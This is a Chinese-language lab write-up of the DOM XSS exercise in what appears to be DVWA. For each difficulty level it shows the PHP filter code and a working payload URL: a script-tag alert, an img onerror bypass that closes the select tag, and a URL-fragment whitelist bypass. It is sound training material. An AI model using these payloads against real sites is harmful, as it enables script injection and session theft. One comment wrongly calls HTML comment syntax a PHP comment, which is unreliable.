<center>XSS DOMdom型xss</center>









[toc]







## XSS DOMdom型xss

> XSS DOMdom型xss









### 1. low

> 低级

```php
没有任何防护
    
<?php

# No protections, anything goes
```

```shell
# 可以直接插入前端代码
http://192.168.0.111:8000/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(/xss/)%3C/script%3E
```







### medium

> 中级

```php
<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
    $default = $_GET['default'];
    
    # Do not allow script tags
    if (stripos ($default, "<script") !== false) {
        header ("location: ?default=English");
        exit;
    }
}

```

> 做了过滤： stripos：stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。
>
>  [runoob](https://www.runoob.com/php/func-string-stripos.html)

```shell
# img 做弹窗
http://192.168.0.111:8000/vulnerabilities/xss_d/?default=English%3Cimg%20src=1%20onerror=alert(/xss/)%3E

# 写入到 value 中了
<option value="English%3Cimg%20src=1%20onerror=alert(/xss/)%3E">English</option>

# 绕过 加</select>闭合这个html
http://192.168.0.111:8000/vulnerabilities/xss_d/?default=English%3C/select%3E%3Cimg%20src=1%20onerror=alert(/xss/)%3E
```







### 3. high

> 高级

```php

<?php

// Is there any input?
if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {

    # White list the allowable languages
    switch ($_GET['default']) {
        case "French":
        case "English":
        case "German":
        case "Spanish":
            # ok
            break;
        default:
            header ("location: ?default=English");
            exit;
    }
}
```

> 逻辑方面的漏洞
>
> ```php
> # php 注释
> <! -- 注释 -- >
> ```

```shell
# get参数，把#后面的代码注释了。返回到前端了
http://192.168.0.111:8000/vulnerabilities/xss_d/?default=French#%3Cscript%3Ealert(/xss/)%3C/script%3E
```

